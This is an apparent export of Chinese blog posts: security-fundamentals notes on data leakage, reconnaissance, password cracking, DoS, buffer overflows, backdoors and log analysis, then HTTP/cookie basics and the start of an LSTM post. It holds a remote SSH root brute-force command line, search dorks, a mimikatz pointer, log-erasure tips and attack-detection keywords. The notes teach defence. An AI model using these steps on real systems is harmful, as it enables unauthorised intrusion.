<ul>
<li>敏感数据和这些数据的备份，包括静态数据、传输中的数据甚至是客户浏览器中的数据往往存在被泄漏的可能</li>
<li>攻击者通常不直接攻击加密系统。他们往往通过诸如窃取密钥、发起中间人攻击或从服务器窃取明文数据等方式对传输中的或者客户浏览器中的数据进行破解</li>
</ul>
<h3 id="敏感信息泄漏表现形式"><a href="#敏感信息泄漏表现形式" class="headerlink" title="敏感信息泄漏表现形式"></a>敏感信息泄漏表现形式</h3><ul>
<li>在此领域最常见的漏洞是：应该加密的数据不进行加密</li>
<li>在使用加密的情况下，常见的问题是不安全的密钥生成和管理和使用弱算法是很普遍的，特别是使用弱的哈希算法来保护密码</li>
<li>浏览器的漏洞也很普遍，且可以很轻易的检测到，但是很难大规模的利用</li>
</ul>
<h3 id="敏感数据防护检查"><a href="#敏感数据防护检查" class="headerlink" title="敏感数据防护检查"></a>敏感数据防护检查</h3><p>对于敏感数据，应当确保：</p>
<ul>
<li>当这些数据被长期存储的时候，无论存储在哪里，他们是否都被加密，特别是对这些数据的备份？</li>
<li>无论内部数据还是外部数据，传输时是否是明文传输？在互联网中传输明文数据是非常危险的。</li>
<li>是否还在使用任何旧的活脆弱的加密算法？</li>
<li>加密密钥的生成是否是脆弱的，或者缺少恰当的密钥管理或缺少密钥回转？</li>
<li>当浏览器接受或发送敏感数据时，是否有浏览器安全指令或头文件丢失？</li>
</ul>
<h3 id="敏感信息泄漏案例"><a href="#敏感信息泄漏案例" class="headerlink" title="敏感信息泄漏案例"></a>敏感信息泄漏案例</h3><ul>
<li>案例1：一个网站上所有需要身份验证的网页都没有使用SSL。攻击者只需要监控网络数据流（比如一个开放的无线网络或其社区的有线网络），并窃取一个已验证的受害者的会话cookie。然后，攻击者利用这个cookie执行重放攻击并接管用户的会话从而访问用户的隐私数据</li>
<li>案例2：密码数据库使用unsalted的哈希算法去存储每个人的密码。一个文件上传漏洞使黑客能够获取密码文件。所有这些unsalted哈希的密码通过彩虹表暴力破解方式破解。</li>
</ul>
<h3 id="敏感信息泄漏的预防"><a href="#敏感信息泄漏的预防" class="headerlink" title="敏感信息泄漏的预防"></a>敏感信息泄漏的预防</h3><ul>
<li>预测一些威胁，加密这些数据的存储以确保免受这些威胁</li>
<li>对于没有必要存放的、重要的敏感数据，应当尽快清除</li>
<li>确保使用了合适的强大的标准算法和强大的密钥，并且密钥管理到位</li>
<li>确保使用密码专用算法存储密码，如：bcrypt、PBKDF2或者scrypt</li>
</ul>
<h3 id="使用有漏洞的组件概述"><a href="#使用有漏洞的组件概述" class="headerlink" title="使用有漏洞的组件概述"></a>使用有漏洞的组件概述</h3><ul>
<li>一些含有漏洞的组件（如框架库）可以被自动化工具发现和利用。攻击者通过扫描或者手动分析识别问题组件，然后根据需要定制攻击代码并实施攻击</li>
<li>大多数的应用都存在这些问题。因为大多数的开发团队并不会把及时更新组件/库作为他们的工作重心</li>
<li>在很多情况下，开发者都不了解他们所使用的全部组件，更不用说组件的版本了。组件的依赖性使情况更加糟糕</li>
</ul>
<h3 id="组件漏洞案例"><a href="#组件漏洞案例" class="headerlink" title="组件漏洞案例"></a>组件漏洞案例</h3><ul>
<li>struts2开发框架漏洞</li>
<li>openssl漏洞导致内存泄漏</li>
</ul>
<h3 id="使用含有已知漏洞的组件预防"><a href="#使用含有已知漏洞的组件预防" class="headerlink" title="使用含有已知漏洞的组件预防"></a>使用含有已知漏洞的组件预防</h3><ul>
<li>使用最新版本的组件</li>
<li>软件项目应该有如下的流程：<ol>
<li>标示您正在使用的所有组件及其版本，包括所有的组件（比如版本插件</li>
<li>在公共数据库（漏洞库），项目邮件列表和安全邮件列表中时刻关注这些组件的安全信息并保证他们是最新的</li>
<li>建立组件使用的安全策略，比如需要某些软件开发实践，通过安全性测试和可接受的授权许可</li>
<li>在适当的情况下，考虑增加对组件的安全封装，去掉不使用的功能或安全薄弱的或组件易受攻击的方面</li>
</ol>
</li>
</ul>
<h1 id="03-安全攻击与防御"><a href="#03-安全攻击与防御" class="headerlink" title="03-安全攻击与防御"></a>03-安全攻击与防御</h1><h2 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1-信息收集"></a>3.1-信息收集</h2><h3 id="安全攻击与防护"><a href="#安全攻击与防护" class="headerlink" title="安全攻击与防护"></a>安全攻击与防护</h3><ul>
<li>攻击的过程（踩点-定位-入侵-后门-痕迹<ul>
<li>信息收集</li>
<li>目标分析</li>
<li>实施攻击</li>
<li>方便再次进入</li>
<li>打扫战场</li>
</ul>
</li>
<li>防护：针对以上提到的行为了解其原理并考虑应对措施</li>
</ul>
<h3 id="信息收集-入侵的第一步"><a href="#信息收集-入侵的第一步" class="headerlink" title="信息收集-入侵的第一步"></a>信息收集-入侵的第一步</h3><ul>
<li>为何要收集信息（知己知彼，百战不殆<ul>
<li>获取攻击目标大概信息</li>
<li>为下一步攻击做准备</li>
<li>利用收集的信息直接攻击</li>
</ul>
</li>
</ul>
<h3 id="信息收集与分析案例"><a href="#信息收集与分析案例" class="headerlink" title="信息收集与分析案例"></a>信息收集与分析案例</h3><ul>
<li>信息收集的概念：情报学中的一个领域</li>
<li>传统的信息收集：案例：著名的照片泄密案</li>
<li>互联网时代的信息收集<ul>
<li>信息技术的发展使得数据大量被生产出来</li>
<li>案例：明星的家庭住址</li>
</ul>
</li>
</ul>
<h3 id="收集哪些信息"><a href="#收集哪些信息" class="headerlink" title="收集哪些信息"></a>收集哪些信息</h3><ul>
<li>目标系统的信息系统相关资料<ul>
<li>域名、网络拓扑、操纵系统、应用软件</li>
<li>相关脆弱性</li>
</ul>
</li>
<li>目标系统的组织相关资料<ul>
<li>组织架构及关联组织</li>
<li>地理位置细节</li>
<li>电话号码、邮件等联系方式</li>
<li>近期重大事件</li>
<li>员工简介</li>
</ul>
</li>
<li>其他可能令攻击者感性去的任何信息</li>
</ul>
<h3 id="公开信息收集-搜索引擎"><a href="#公开信息收集-搜索引擎" class="headerlink" title="公开信息收集-搜索引擎"></a>公开信息收集-搜索引擎</h3><ul>
<li>快速定位<ul>
<li>Google“5sf67.jsp”可找到存在此脚本的web网站</li>
<li>Google 搜索”teweb/default.tml”就可以找到开放着远程web连接的服务器</li>
</ul>
</li>
<li>信息挖掘<ul>
<li>定点采集（Google搜索”.doc + website”挖掘信息</li>
<li>隐藏信息（.mdb, .ini, .txt, .old, .bak, .001……</li>
<li>后台入口</li>
</ul>
</li>
</ul>
<h3 id="互联网社工库"><a href="#互联网社工库" class="headerlink" title="互联网社工库"></a>互联网社工库</h3><ul>
<li>待收集</li>
</ul>
<h3 id="网络信息收集-域名收集"><a href="#网络信息收集-域名收集" class="headerlink" title="网络信息收集-域名收集"></a>网络信息收集-域名收集</h3><ul>
<li>whois<ul>
<li>whose是一个标准服务，可以用来查询域名是否被注册以及注册的详细资料</li>
<li>whois可以查询到的信息：域名所有者、域名及IP地址对应信息、联系方式、域名到期/注册日期</li>
</ul>
</li>
</ul>
<h3 id="系统及应用信息收集-端口扫描"><a href="#系统及应用信息收集-端口扫描" class="headerlink" title="系统及应用信息收集-端口扫描"></a>系统及应用信息收集-端口扫描</h3><ul>
<li>原理：通过端口扫描确定主机开放的端口，不同的端口对应着不同的网络服务</li>
<li>扫描方式：全扫描、半打开扫描、隐秘扫描、漏洞扫描</li>
<li>端口扫描-Nmap：扫描器之王（使用详情见其他笔记</li>
</ul>
<h3 id="信息收集与分析工具-扫描器"><a href="#信息收集与分析工具-扫描器" class="headerlink" title="信息收集与分析工具-扫描器"></a>信息收集与分析工具-扫描器</h3><ul>
<li>网络设备漏洞扫描器（如Cisco auditing tools</li>
<li>集成化的漏洞扫描器（如Nessus</li>
<li>专业web扫描软件（如appscan</li>
<li>数据库漏洞扫描器（如iss database scanner</li>
</ul>
<h2 id="3-2-漏洞利用"><a href="#3-2-漏洞利用" class="headerlink" title="3.2-漏洞利用"></a>3.2-漏洞利用</h2><h3 id="利用人性懒惰-密码破解"><a href="#利用人性懒惰-密码破解" class="headerlink" title="利用人性懒惰-密码破解"></a>利用人性懒惰-密码破解</h3><ul>
<li>密码破解方法<ul>
<li>暴力猜解</li>
</ul>
</li>
<li>密码破解工具<ul>
<li>密码暴力破解工具</li>
<li>密码字典生成工具</li>
</ul>
</li>
<li>密码破解防御<ul>
<li>密码生成技巧</li>
<li>密码管理策略</li>
</ul>
</li>
</ul>
<h3 id="暴力猜解法一散列值破解"><a href="#暴力猜解法一散列值破解" class="headerlink" title="暴力猜解法一散列值破解"></a>暴力猜解法一散列值破解</h3><ul>
<li>已知密码的散列算法及散列值的破解方法<ul>
<li>Linux密码散列值</li>
<li>Windows密码散列值（LM-Hash）</li>
</ul>
</li>
<li>获取散列值工具：pwdump7.exe、gethashes.exe、Cain</li>
<li>破解散列值工具：John the ripper、lophtcrack</li>
<li>从网站等公开渠道得到散列值破解结果</li>
</ul>
<h3 id="基于内存信息的读取"><a href="#基于内存信息的读取" class="headerlink" title="基于内存信息的读取"></a>基于内存信息的读取</h3><ul>
<li>神器：mimikatz（如何使用自行百度</li>
</ul>
<h3 id="暴力猜解法二远程密码破解"><a href="#暴力猜解法二远程密码破解" class="headerlink" title="暴力猜解法二远程密码破解"></a>暴力猜解法二远程密码破解</h3><ul>
<li>如远程暴力破解unix口令：<code>brutessh.exe -h ip -IP -u root -d mypasslist.txt</code></li>
</ul>
<h3 id="密码字典-密码破解关键"><a href="#密码字典-密码破解关键" class="headerlink" title="密码字典-密码破解关键"></a>密码字典-密码破解关键</h3><ul>
<li>字典生成器<ul>
<li>根据用户规则快速生成各类密码字典</li>
<li>攻击者常用的工具</li>
</ul>
</li>
<li>密码字典作用<ul>
<li>提高密码破解效率</li>
<li>密码破解知识的具体体现</li>
</ul>
</li>
</ul>
<h3 id="口令攻击方式"><a href="#口令攻击方式" class="headerlink" title="口令攻击方式"></a>口令攻击方式</h3><ul>
<li>暴力破解<ul>
<li>手工方式：社会工程学、尝试默认口令</li>
<li>自动猜测</li>
<li>工具：John、LC、hydra</li>
</ul>
</li>
<li>嗅探窃听<ul>
<li>网络截获、键盘监听</li>
<li>工具：sniffer、IKS</li>
</ul>
</li>
</ul>
<h3 id="metasploit框架"><a href="#metasploit框架" class="headerlink" title="metasploit框架"></a>metasploit框架</h3><ul>
<li>利用msf中mysql相应模块破解mysql</li>
<li>msf同样可破解其他，如tomcat</li>
</ul>
<h3 id="密码破解安全防御"><a href="#密码破解安全防御" class="headerlink" title="密码破解安全防御"></a>密码破解安全防御</h3><ul>
<li>设置好的密码：自己容易记，别人不好猜</li>
<li>系统及应用安全策略：账户锁定策略</li>
<li>随机验证码</li>
<li>其他密码管理策略<ul>
<li>密码专用/分级，不同应用/系统/网站不同密码</li>
<li>专用密码管理工具</li>
<li>A、B角</li>
</ul>
</li>
</ul>
<h3 id="利用人性弱点-社会工程学攻击"><a href="#利用人性弱点-社会工程学攻击" class="headerlink" title="利用人性弱点-社会工程学攻击"></a>利用人性弱点-社会工程学攻击</h3><ul>
<li>什么是社会工程学攻击：利用人性弱点（本能反应、贪婪、易于信任）进行欺骗获取利益的攻击方法</li>
<li>社会工程学的危险<ul>
<li>永远有效的攻击方法</li>
<li>人是最不可控的因素</li>
</ul>
</li>
<li>人性的弱点<ul>
<li>信任权威</li>
<li>信任共同爱好</li>
<li>获得好处后报答</li>
<li>期望守信</li>
<li>期望社会认可</li>
<li>短缺资源的渴望</li>
</ul>
</li>
<li>传统的社会工程学：中奖通知、欠费电话、退税短信、催交房租</li>
<li>网络社会中的社会工程学<ul>
<li>直接用于攻击<ul>
<li>正面攻击（直接索取</li>
<li>建立信任</li>
<li>利用同情、内疚和胁迫</li>
</ul>
</li>
<li>间接用于攻击<ul>
<li>口令破解中的社会工程学利用</li>
<li>网络攻击中的社会工程学利用</li>
</ul>
</li>
</ul>
</li>
<li>社会工程学防御<ul>
<li>安全意识培训<ul>
<li>知道什么是社会工程攻击</li>
<li>社会工程学利用什么</li>
</ul>
</li>
<li>建立相应的安全响应应对措施<ul>
<li>构建完善的技术防御体系</li>
<li>有效的安全管理体系和操作流程</li>
</ul>
</li>
<li>注意保护个人隐私（生日、手机号码</li>
</ul>
</li>
</ul>
<h3 id="利用系统缺陷-拒绝服务攻击"><a href="#利用系统缺陷-拒绝服务攻击" class="headerlink" title="利用系统缺陷-拒绝服务攻击"></a>利用系统缺陷-拒绝服务攻击</h3><ul>
<li>拒绝服务攻击：让被攻击的系统无法正常进行服务的攻击方式（是一类攻击方式的统称）</li>
<li><p>拒绝服务攻击方式</p>
<ul>
<li>利用系统、协议或服务的漏洞<ul>
<li>利用TCP协议实现缺陷</li>
<li>利用操作系统或应用软件的漏洞</li>
</ul>
</li>
<li>目标系统服务资源能力<ul>
<li>利用大量数据挤占网络带宽</li>
<li>利用大量请求消耗系统性能</li>
</ul>
</li>
<li>混合型</li>
</ul>
</li>
<li><p>典型的拒绝服务攻击方式：syn flood、udp flood、teardrop、smurf、land……</p>
</li>
<li>分布式拒绝服务攻击DDOS</li>
</ul>
<h3 id="拒绝服务攻击的防御"><a href="#拒绝服务攻击的防御" class="headerlink" title="拒绝服务攻击的防御"></a>拒绝服务攻击的防御</h3><ul>
<li>管理防御<ul>
<li>业务连续性计划（组织共同承担，应对Dos攻击</li>
<li>协调机制（运营商、公安部门、专家团队</li>
</ul>
</li>
<li>技术防御<ul>
<li>安全设备（防火墙、抗dos设备</li>
<li>增强网络带宽</li>
<li>自身强壮性（风险评估、补丁、安全加固、资源控制</li>
</ul>
</li>
<li>检测防御：应急响应（构建检测体系</li>
</ul>
<h3 id="利用系统开发缺陷-缓冲区溢出"><a href="#利用系统开发缺陷-缓冲区溢出" class="headerlink" title="利用系统开发缺陷-缓冲区溢出"></a>利用系统开发缺陷-缓冲区溢出</h3><ul>
<li>攻击原理：缓冲区溢出攻击利用编写不够严谨的程序，通过向程序的缓冲区写入超过预定长度的数据，造成缓存的溢出，从而破坏程序的堆栈，导致程序执行流程的改变</li>
<li>缓冲区溢出的危害<ul>
<li>最大数量的漏洞类型</li>
<li>漏洞危害等级高</li>
</ul>
</li>
</ul>
<h3 id="缓冲区溢出基础"><a href="#缓冲区溢出基础" class="headerlink" title="缓冲区溢出基础"></a>缓冲区溢出基础</h3><ul>
<li>堆栈：一段连续分配的内存空间</li>
<li><p>堆栈特点</p>
<ul>
<li>后进先出</li>
<li>堆栈生长方向与内存地址方向相反</li>
</ul>
</li>
<li>指针：指向内存单元的地址</li>
<li><p>寄存器：</p>
<ul>
<li>暂存指令、数据和位址</li>
<li>ESP（栈顶）、EBP（栈底）、EIP（返回地址）</li>
</ul>
</li>
<li><p>攻击过程</p>
<ul>
<li>如果可以精确控制内存跳转地址，就可以执行指定代码，获得权限或破坏系统</li>
<li>寻找程序漏洞-编制缓冲区溢出程序-精确控制跳转地址-执行设定的代码-获得系统权限或破坏系统</li>
</ul>
</li>
<li><p>漏洞的利用：metasploit使用（见其他笔记</p>
</li>
<li><p>如何防范</p>
<ul>
<li>用户：补丁、防火墙</li>
<li>开发人员<ul>
<li>编写安全代码，对输入数据进行验证</li>
<li>使用相对安全的函数</li>
</ul>
</li>
<li>系统<ul>
<li>缓冲区不可执行技术</li>
<li>虚拟化技术</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="3-3-后门及日志"><a href="#3-3-后门及日志" class="headerlink" title="3.3-后门及日志"></a>3.3-后门及日志</h2><h3 id="后门设置的方法"><a href="#后门设置的方法" class="headerlink" title="后门设置的方法"></a>后门设置的方法</h3><ul>
<li>后门可以作什么<ul>
<li>方便下次直接进入</li>
<li>监视用户所有行为、隐私</li>
<li>完全控制用户主机</li>
</ul>
</li>
<li>后门设置的类型<ul>
<li>账号后门<ul>
<li>现有管理员账号密码/新建账号/升级现有账号权限</li>
<li>普通账号shell设置setuid</li>
</ul>
</li>
<li>漏洞后门</li>
<li>木马（rootkit</li>
<li>脚本后门</li>
</ul>
</li>
</ul>
<h3 id="后门的清除及防范"><a href="#后门的清除及防范" class="headerlink" title="后门的清除及防范"></a>后门的清除及防范</h3><ul>
<li>账号后门<ul>
<li>管理员账号：定期更换密码</li>
<li>定期检查系统是否有多余账号和具有管理员权限的账号</li>
<li>检查Linux系统中的setuid程序</li>
</ul>
</li>
<li>漏洞后门<ul>
<li>补丁</li>
</ul>
</li>
<li>后门木马<ul>
<li>杀毒软件</li>
<li>系统检查：服务、进程、端口</li>
<li>完整性检验</li>
</ul>
</li>
<li>脚本后门<ul>
<li>安全脚本备份</li>
<li>网页防篡改</li>
</ul>
</li>
</ul>
<h3 id="攻击痕迹清除"><a href="#攻击痕迹清除" class="headerlink" title="攻击痕迹清除"></a>攻击痕迹清除</h3><ul>
<li>清除/改写日志<ul>
<li>要知道常见的日志存放路径</li>
<li>修改系统日期</li>
</ul>
</li>
<li>删除中间文件</li>
<li>删除创建的用户</li>
</ul>
<h3 id="攻击痕迹清除防护措施-日志保护"><a href="#攻击痕迹清除防护措施-日志保护" class="headerlink" title="攻击痕迹清除防护措施-日志保护"></a>攻击痕迹清除防护措施-日志保护</h3><ul>
<li>日志设置<ul>
<li>尽可能多的信息</li>
<li>日志时间</li>
<li>日志空间</li>
</ul>
</li>
<li>日志权限</li>
<li>日志存储<ul>
<li>本地路径及备份方式</li>
<li>网络存储（日志服务器</li>
</ul>
</li>
</ul>
<h3 id="日志分析重点"><a href="#日志分析重点" class="headerlink" title="日志分析重点"></a>日志分析重点</h3><ul>
<li>日期 时间（确定攻击的时间</li>
<li>源IP（确定攻击者IP</li>
<li>请求方法（部分情况下要关注post操作</li>
<li>请求链接（查找链接中的特殊字符串</li>
<li>状态代码（了解操作结果</li>
</ul>
<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><ul>
<li>关注超长的记录<ul>
<li>http协议对URL长度没有限制</li>
<li>一般网站正常情况下不需要太长的URL</li>
</ul>
</li>
<li>关注记录中的非正常编码<ul>
<li>例如红色代码蠕虫攻击会形成如下记录（略</li>
</ul>
</li>
<li>关注日志请求链接中的关键字<ul>
<li>cmd、select、xp_cmdshell、post等</li>
</ul>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>信息收集与分析</li>
<li>基于人性弱点的攻击：密码破解、社会工程学</li>
<li>基于系统及协议缺陷的攻击：拒绝服务，电子欺骗</li>
<li>基于软件开发缺陷的攻击：缓冲区溢出、sql注入、跨站脚本</li>
<li>后门与日志分析</li>
</ul>
]]></content>
      <categories>
        <category>信息安全基础</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全之Web安全基础</title>
    <url>/2019/04/23/base/%E4%BF%A1%E5%AE%89%E5%AE%89%E5%85%A8%E4%B9%8BWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="01-Web安全基础"><a href="#01-Web安全基础" class="headerlink" title="01-Web安全基础"></a>01-Web安全基础</h1><h2 id="1-1-web工作机制"><a href="#1-1-web工作机制" class="headerlink" title="1.1-web工作机制"></a>1.1-web工作机制</h2><ul>
<li>架构：web服务器、中间件、数据库</li>
</ul>
<ol>
<li><p>用户——web浏览器——接入网络——web服务器。用户发出请求，服务器根据请求的URL的地址连接，找到对应的网页文件，发送给用户，两者对话的“官方语言”是HTTP。网页文件是用文本描述的，html/xml格式，在用户浏览器中有个解释器，把这些文本描述的页面恢复成图文并茂、有声有影的可是页面</p>
</li>
<li><p>通常情况下，用户要访问的页面都存在web服务器的某个固定目录下，是一些.html或.xml文件，用户通过页面上的超链接即URL地址可以在网站页面之间”跳跃”，这就是静态的网页。<a id="more"></a></p>
<p>后来人们觉得这种方式只能单向的给用户展示信息，信息发布还可以，但让用户做一些比如身份认证、投票选举之类的事情就比较麻烦，由此产生了动态网页的概念；所谓动态就是利用flash、PHP、asp、Java等技术在网页中嵌入一些可运行的“小程序”，用户浏览器在解释页面时，看到这些小程序就启动运行它。</p>
<p>小程序的用法很灵湖，可以展示一段动画（如flash），也可以在你的pc上生成一个文件，或者接收你输入的一段信息，这样就可以根据你的“想法”，对页面进行定制处理</p>
</li>
<li><p>“小程序”的使用让web服务模式有了“双向交流”的能力，web服务模式也可以像传统软件一样进行各种事务处理，如编辑文件、利息计算、提交表格等</p>
<p>这些“小程序”可以嵌入在页面中，也可以以文件的形式单独存放在web服务器的目录里，如.asp、.php、.jsp文件等，并且可以在开发时指定是在用户端运行，还是在服务器端运行；</p>
<p>这样功能性的小程序越来越多，形成常用的工具包，单独管理，web业务开发时，直接使用就可以了，这就是中间件服务器，他实际上是web服务器处理能力的扩展。</p>
</li>
<li><p>静态网页与“小程序”都是事前设计好的，一般不经常改动，但网站上很多内容需要经常的更新，如新闻等，这些变动的数据放在静态的程序中显然不合适，传统的方法是数据与程序分离，采用专业的数据库；</p>
<p>web开发者在web服务器后面增加了一个数据库服务器，这些经常变化的数据存进数据库，可以随时更新。当用户请求页面时，“小程序”根据用户要求的页面，涉及到动态数据的地方，利用sql数据库语言，从数据中读取最新的数据，生成“完整”页面，最后送给用户，如股市行情曲线，就是由一个不断刷新的小程序控制。</p>
</li>
<li><p>除了应用数据需要变化，用户的一些状态信息、属性信息也需要临时记录而web服务器本来是不记录这些信息的，只管答复你的要求，后来web技术为了”友好互动”，需要记住用户的访问信息，建立了一些新的通讯机制</p>
<p>cookie：把一些用户的参数，如账户名、口令等信息存放在客户端的硬盘临时文件中，用户在此访问这个网站时，参数也一同送给服务器，服务器就能识别身份。</p>
<p>session：把用户的一些参数信息存在服务器的内存中，或写在服务器的硬盘文件中，用户时不可见的，cookie与session可以结合使用。</p>
</li>
<li><p>cookie在用户端，一般采用加密方式存放就可以了；session在服务器端，信息集中，被篡改问题很严重，所以一般放在内存里，尽量不存放在硬盘上。</p>
</li>
</ol>
<h2 id="1-2-http协议"><a href="#1-2-http协议" class="headerlink" title="1.2-http协议"></a>1.2-http协议</h2><h3 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h3><ul>
<li>超文本传输协议</li>
<li>90年提出，当前version 1.1</li>
<li>http设计用来将超文本标记语言html文档从web服务器传送到web浏览器</li>
<li>http是一个请求和回应协议：客户机发送请求，服务器对请求给出回应</li>
<li>http使用可靠的tcp连接，默认tcp端口80</li>
</ul>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul>
<li>支持客户/服务器模式</li>
<li>简单快速：客户向服务器请求服务时，只需传送请求方法和路径</li>
<li>灵活：http允许传输任意类型的数据对象。正在传输的类型由content-type加以决定</li>
<li>无连接：其含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</li>
<li>http协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就比较快。</li>
</ul>
<h3 id="协议结构"><a href="#协议结构" class="headerlink" title="协议结构"></a>协议结构</h3><ul>
<li>http会话<ul>
<li>requests<ul>
<li>请求行：方法，URL，协议/版本</li>
<li>消息报头</li>
<li>请求正文</li>
</ul>
</li>
<li>response<ul>
<li>状态行：协议，状态，代码描述（1xx-提示信息、2xx-成功、3xx-重定向、4xx-客户端错误、5xx-服务器端错误）</li>
<li>消息报头</li>
<li>响应正文</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h3><ul>
<li>请求方法：规定了客户与服务器联系的类型不同</li>
<li>v1.1 支持7种请求方法：GET、POST、HEAD、OPTIONS、PUT、DELETE、TRACE</li>
<li>get与post最常用<ul>
<li>get：把所有请求的数据都放在URL中，从URL中可以直接看到，但最大传输的信息量是2KB</li>
<li>post：把请求的数据放在请求的数据体中，在URL中不可见，长度不受限，常用于提交表单</li>
</ul>
</li>
</ul>
<h3 id="http请求URL"><a href="#http请求URL" class="headerlink" title="http请求URL"></a>http请求URL</h3><ul>
<li>URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息</li>
<li><code>http://host[:port][abs_path]</code><ul>
<li>http表示要通过http协议来定位网络资源</li>
<li>host表示合法的internet主机域名或IP地址</li>
<li>port指定一个端口号，为空则使用缺省端口80</li>
<li>abs_path：制定请求的资源的URI（如果URL中没有给出abs_path，那么当它作为请求URI时，必须以“/”的形式给出，通常这个工作浏览器自动帮我们完成。</li>
</ul>
</li>
</ul>
<h3 id="协议缺陷"><a href="#协议缺陷" class="headerlink" title="协议缺陷"></a>协议缺陷</h3><ul>
<li>数据未加密<ul>
<li>http协议没有加密功能，传输的数据都是以明文显示，因此在传输过程中可能会被攻击者截取账号及密码等重要信息</li>
<li>解决：利用ssl加密</li>
</ul>
</li>
<li>无状态协议<ul>
<li>http不会记录前一次传输的数据信息，因此无法实现服务器和客户端的交互</li>
<li>解决：利用cookie和session机制</li>
</ul>
</li>
</ul>
<h2 id="1-3-http协议分析工具"><a href="#1-3-http协议分析工具" class="headerlink" title="1.3-http协议分析工具"></a>1.3-http协议分析工具</h2><ul>
<li>webscarab</li>
<li>burpsuite（常用，见相关笔记</li>
</ul>
<h2 id="1-4-cookie和session机制"><a href="#1-4-cookie和session机制" class="headerlink" title="1.4-cookie和session机制"></a>1.4-cookie和session机制</h2><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><ul>
<li><p>http协议本身是无状态协议，http不会记录前一次传输的数据信息，因此无法实现服务器和客户端的交互。</p>
</li>
<li><p>而很多情况下，我们和服务器之间的一个会话不是一个动作就完成了，所以我们希望能在客服端和服务器这个交互的会话期间内，服务器能够保持对客户端会话的识别，也就是保持对http的状态性</p>
</li>
<li><p>cookie，有时也用其复数形式cookies，指某些网站为了辨别用户身份、进行session跟踪而存储在用户本地终端上的数据（通常经过加密</p>
</li>
<li><p>cookie的动机：客户端在浏览多个页面时，提供事务transaction的功能，为服务器提供状态管理</p>
</li>
<li><p>如实现授权管理，用户不用每个页面都输入用户名和密码</p>
</li>
<li><p>每个cookie都有一定的URL范围，客户请求这个范围的URL，都要提供这个cookie</p>
</li>
<li><p>cookie由服务器向客户端写入，包含在http响应头中的setcookie字段，格式如下：</p>
<p><code>set-cookie name | value | path | domain | expires</code></p>
</li>
<li><p>cookie被写入到客户端的internet temporary files文件夹内，当客户端请求域名范围内的URL时，会读取cookie文件，并在http请求头中显示</p>
</li>
<li><p>cookie的安全</p>
<ul>
<li>一般由服务器向客户端写入，可以包含个性化信息，有时也会被web站点设计包含站点的认证信息</li>
<li>分为永久性cookie和会话cookie，永久cookie保存在客户端硬盘中，会话cookie在会话结束后失效</li>
<li>脚本语音，可以盗取cookie，当cookie中包含用户的敏感信息时，因此攻击者可以利用xss技术，盗取cookie信息，这样会造成用户信息泄漏，甚至重放攻击。</li>
</ul>
</li>
</ul>
<h3 id="session机制"><a href="#session机制" class="headerlink" title="session机制"></a>session机制</h3><ul>
<li>session，相对于cookie，就是将会话信息存储在服务器端，而非客户端，并且存储于服务端内存中，会话结束而失效</li>
<li>session机制的实现，是在服务端保存状态。相比客户端cookie存储，安全性更高</li>
<li>当用户第一次访问web站点时，由服务器记录会话，并生成sessionID来标识一个客户端的会话。同时，通过cookie向客户端传递这个sessionID</li>
<li>客户端后续的会话，会由浏览器自动携带这个sessionID，服务器根据保存的sessionID和收到的sessionID来判断会话信息</li>
<li>session由于保存在服务器端的内存中，生存周期较短，不容易泄漏，并可以有效防止重放攻击。相比cookie技术更安全</li>
<li>但是session必须依赖cookie技术。若客户端禁用了cookie，那么必须依赖URL重写等技术来实现客户端携带sessionID信息。</li>
</ul>
]]></content>
      <categories>
        <category>信息安全基础</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习-循环神经网络-LSTM</title>
    <url>/2019/04/15/etc/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%BE%AA%E7%8E%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-LSTM/</url>
    <content><![CDATA[<h3 id="01-简介"><a href="#01-简介" class="headerlink" title="01-简介"></a>01-简介</h3><ul>
<li>LSTM，long-short term memory ，长短期记忆</li>
<li>普通RNN存在弊端，为了解决此弊端而提出</li>
</ul>
<h3 id="02-RNN弊端"><a href="#02-RNN弊端" class="headerlink" title="02-RNN弊端"></a>02-RNN弊端</h3><ul>
<li>RNN，在有顺序的数据上进行学习；<a id="more"></a></li>
<li>为了记住这些数据, RNN 会像人一样产生对先前发生事件的记忆</li>
<li>不过一般形式的 RNN 就像一个老爷爷, 有时候比较健忘</li>
<li>为何健忘（通俗讲）<ul>
<li>现有一个 RNN, 输入值是一句话: “要做红烧排骨, 首先要准备排骨, 然后…., 就出锅了”；</li>
<li>RNN 来分析做的到底是什么菜呢？RNN可能会给出“辣子鸡”这个答案；</li>
<li>由于判断失误, RNN就要开始学习 这个长序列 X 和 ‘红烧排骨’ 的关系 , 而RNN需要的关键信息 ”红烧排骨”却出现在句子开头。</li>
</ul>
</li>
<li>为何健忘（理论层面）<ul>
<li>“红烧排骨”这个信息原的记忆要进过长途跋涉才能抵达最后一个时间点；</li>
<li>过程中会产生误差, 在反向传递得到误差时, 会在每一步乘以一个参数 W；</li>
<li>若W是一个小于1的数，W不断乘以误差, 误差传到初始时间点时，会是一个接近于零的数</li>
<li>故对于初始时刻, 误差相当于就消失了，这个问题叫做梯度消失或者梯度弥散 Gradient vanishing；</li>
<li>反之，若W 是一个大于1 的数，不断累乘到最后就变成了无穷大的数；</li>
<li>RNN被这无穷大的数撑死了, 这种情况我们叫做剃度爆炸, Gradient exploding</li>
